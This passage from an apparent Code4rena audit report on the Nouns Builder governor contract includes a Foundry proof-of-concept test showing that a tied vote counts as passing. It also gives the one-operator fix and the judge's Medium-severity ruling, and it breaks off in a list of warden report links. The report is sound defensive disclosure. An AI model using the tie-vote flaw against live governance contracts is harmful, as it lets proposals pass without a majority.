class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Pending</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if voting has not ended:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteEnd</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Active</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal failed (outvoted OR didn&#39;t reach quorum):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">againstVotes</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal has not been queued:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">timestamp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Succeeded</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal can no longer be executed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isExpired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Expired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else the proposal is queued</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Queued</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please append the following test in <code>test\\Gov.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_ProposalIsSucceededWhenNumberOfForAndAgainstVotesAreSame</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unpause</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">createVoters</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateQuorumThresholdBps</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">votingDelay</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// number of for and against votes are both 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">castVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">votingPeriod</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// the proposal is considered succeeded when number of for and against votes are the same after voting ends</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Succeeded</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// the proposal can be queued afterwards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">queue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Queued</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>If there is no need to pass a proposal when <code>proposal.forVotes</code> and <code>proposal.againstVotes</code> are the same at the end of voting, then <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441-L442\">Governor.sol#L441-L442</a> can be changed to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">againstVotes</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Otherwise, a governance configuration can be added to indicate whether the majority of votes is needed or not for supporting and passing a proposal. The <code>state</code> function then could return <code>ProposalState.Defeated</code> when <code>proposal.forVotes &#x3C;= proposal.againstVotes</code> if so and when <code>proposal.forVotes &#x3C; proposal.againstVotes</code> if not.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626\">tbtstl (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626#issuecomment-1258853233\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a flaw in order of operations and usage of the strict less than sign operator, a proposal with exactly 50% support can still pass as successful.</p>\n<p>This can be dramatic as the definition of Majority is “The greater number”, which we would quantity as 50% + 1.</p>\n<p>The finding is valid in that a situation can arise in which a proposal, with 50% detractors, would still pass, however, the specific operator <code>&#x3C;</code> means that this can happen exclusively if the different is by one, meaning that of all possible “vote distributions”, we’d need a perfect 50/50.</p>\n<p>Because of that, while I believe the finding should be mitigated, I think the finding is of Medium Severity as it will happen only in a specific situation.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 124 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/104\">report highlighted below</a> by <strong>Lambda</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/684\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/381\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/472\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/399\">simon135</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/139\">R2</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/670\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/278\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/496\">sorrynotsorry</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/12\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/713\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/80\">ChristianKuri</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/543\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/332\">0x4non</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/658\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/320\">CertoraInc</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/663\">cryptphi</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/418\">zkhorse</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/247\">0x1337</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/593\">scaraven</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/527\">leosathya</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/464\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/556\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/266\">indijanc</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/206\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/554\">B2</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/338\">Chom</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/572\">dipp</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/349\">zzzitron</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/315\">imare</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/657\">izhuer</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/297\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/221\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/362\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/60\">robee</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/204\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/192\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/686\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/35\">Tomo</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/544\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/131\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/384\">Respx</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/552\">asutorufos</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/6\">erictee</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/42\">ne0n</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/568\">tonisives</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/483\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/18\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/149\">pcarranzav</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/322\">pedr02b2</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/145\">pfapostol</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/81\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/173\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/47\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/261\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/263\">jonatascm</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/720\">m9800</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/57\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/341\">PwnPatrol</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/26\">0x85102</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/126\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/547\">sahar</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/357\">volky</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/638\">ak1</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/716\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/45\">EthLedger</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/157\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/528\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/326\">PPrieditis</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/258\">Samatak</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/424\">azephiar</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/250\">bulej93</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/577\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/505\">cryptostellar5</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/712\">eierina</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/410\">ElKu</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/129\">Jujic</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/717\">lucacez</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/242\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/516\">sach1r0</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/117\">Tointer</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/722\">bharg4v</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/409\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/231\">Captainkay</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/645\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/386\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/50\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/283\">JansenC</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/359\">neumo</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/682\">peritoflores</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/510\">hyh</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/178\">davidbrai</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/346\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/481\">slowmoses</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/155\">yixxas</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/584\">GimelSec</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/704\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/551\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/176\">bobirichman</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/256\">cloudjunky</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/506\">Diana</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/592\">Funen</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/245\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/520\">ret2basic</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/698\">V_B</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/679\">a12jmx</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/573\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/166\">DimitarDimitrov</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/28\">MasterCookie</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/270\">MEP</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/40\">Noah3o6</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/635\">p_crypt0</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/438\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/639\">pashov</a>, <a 